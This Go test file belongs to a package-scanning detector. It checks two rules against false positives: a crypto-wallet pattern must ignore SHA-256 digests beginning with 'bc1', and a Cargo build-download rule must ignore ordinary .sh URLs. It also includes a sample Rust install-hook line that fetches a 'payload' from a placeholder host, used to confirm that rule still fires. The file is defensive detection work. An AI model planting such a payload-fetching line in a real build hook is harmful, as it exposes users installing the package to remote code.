package detect

import (
	"strings"
	"testing"
)

func TestCryptoWalletPatternDoesNotMatchSHA256Prefix(t *testing.T) {
	// The old bech32 branch had no trailing boundary, so a 64-character digest
	// beginning with bc1 matched its first 62 characters as a Bitcoin address.
	sha256 := "bc1" + strings.Repeat("a", 61)
	findings := Detect(&PackageContext{
		Name:            "legitimate-package",
		Ecosystem:       "pypi",
		PkgbuildContent: "sha256=" + sha256,
	})

	assertFindingAbsent(t, findings, "P-CRYPTO-WALLET")
}

func TestCargoBuildDownloadPatternRequiresRustHTTPClient(t *testing.T) {
	// A generic URL ending in .sh appears in ordinary npm metadata and is not
	// evidence that a Rust build script downloads and executes anything.
	findings := Detect(&PackageContext{
		Name:                 "legitimate-package",
		Ecosystem:            "npm",
		InstallScriptContent: `{"homepage":"https://example.com/setup.sh"}`,
	})
	assertFindingAbsent(t, findings, "P-CARGO-BUILD-DOWNLOAD")

	// Keep the behavior the rule is named for: a Rust HTTP client making a
	// request from an install/build hook.
	findings = Detect(&PackageContext{
		Name:                 "suspicious-package",
		Ecosystem:            "cargo",
		InstallScriptContent: `let body = reqwest::blocking::get("https://example.invalid/payload")?;`,
	})
	assertFindingPresent(t, findings, "P-CARGO-BUILD-DOWNLOAD")
}

func assertFindingAbsent(t *testing.T, findings []Finding, id string) {
	t.Helper()
	for _, finding := range findings {
		if finding.ID == id {
			t.Fatalf("unexpected %s finding on %q", id, finding.MatchedLine)
		}
	}
}

func assertFindingPresent(t *testing.T, findings []Finding, id string) {
	t.Helper()
	for _, finding := range findings {
		if finding.ID == id {
			return
		}
	}
	t.Fatalf("expected %s finding, got %v", id, ids(findings))
}
